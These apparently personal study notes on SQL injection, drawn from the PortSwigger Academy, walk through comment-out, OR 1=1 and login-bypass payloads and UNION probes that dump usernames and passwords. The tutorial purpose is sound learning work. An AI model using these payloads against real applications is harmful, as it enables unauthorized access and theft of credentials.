---
title: SQL Injection Portswigger Academy Notes
date: 2023-01-14 13:35:00 -0500
categories: [Resources]
tags: [SQLi, sql Injection]
---

## Retriving Hidden Data

If the application doesnt provide any protections against SQLi attacks an attacker can construct an attack by commenting out the SQL query with `'--`.

```shell
https://insecure-website.com/products?category=Gifts'--
```

Resulting in the SQL Query:

```sql
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

We can use `'+OR+1=1--` to display all products in any category

```shell
https://insecure-website.com/products?category=Gifts'+OR+1=1--
```

> Take care when injecting the condition `OR 1=1` into a SQL query. Although this may be harmless in the initial context you're injecting into, it's common for applications to use data from a single request in multiple different queries. If your condition reaches an `UPDATE` or `DELETE` statement, for example, this can result in an accidental loss of data. 
{: .prompt-danger }

## Subverting application logic

If a login form doesnt use sqli protections commenting out the user `administrator'--` we can send through a request that looks like this and avoid using a password `SELECT * FROM users WHERE username = 'administrator'--' AND password = ''`

## SQL injection UNION attacks

We can use SQL's UNION keyword to retrive data from other tables in the database. The UNION command lets us chain together SELECT queries and append the results to the origional query.

For union attacks to work the two SELECT queries must return the same number of columns. The data types must be compatible in the different queries.

### Determining the number of columns required in UNION attacks

```shell
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

The response will display different results depending on the query send and you can usually tell what query is working by the response. 

```shell
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
etc.
```

Again, the application might actually return this error message, or might just return a generic error or no results. When the number of nulls matches the number of columns, the database returns an additional row in the result set, containing null values in each column. 

### Finding columns with a useful data type in a SQL injection UNION attack

Once we have determined the number of columns we can probe the colums to test it it contains the string data and if we recieve a good response we can  cycle through chars to get the column information.

```
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

### Using a SQL injection UNION attack to retrieve interesting data

 Suppose that:

   - The original query returns two columns, both of which can hold string data.
   - The injection point is a quoted string within the WHERE clause.
   - The database contains a table called users with the columns username and password.

In this situation, you can retrieve the contents of the users table by submitting the input:

```shell
' UNION SELECT username, password FROM users--
```

Of course to do this attack we have to know the column names and programs now will automatically parse through all characters until it find the correct column name instead of doing this manually that would take years.

### Retrieving multiple values

- `' UNION SELECT username || '~' || password FROM users--`
